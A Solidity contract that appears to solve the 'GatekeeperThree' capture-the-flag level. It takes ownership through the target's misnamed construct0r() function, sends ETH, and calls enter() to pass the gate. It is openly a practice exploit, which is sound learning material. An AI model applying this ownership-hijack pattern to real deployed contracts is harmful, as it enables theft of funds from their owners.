// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "src/GatekeeperThree/GatekeeperThree.sol";

contract GatekeeperThreeSolver {

    GatekeeperThree gate;

    constructor(address payable _gate){
        gate = GatekeeperThree(_gate);
    }

    function exploit() external payable {
        gate.construct0r();
        require(msg.value > 0.001 ether, "Exploit: not enough fund");
        (bool success,) = payable(address(gate)).call{value: msg.value}("");
        require(success, "Exploit: failed to send ETH");
        require(gate.enter(), "Exploit: failed to enter the gate");
    }
}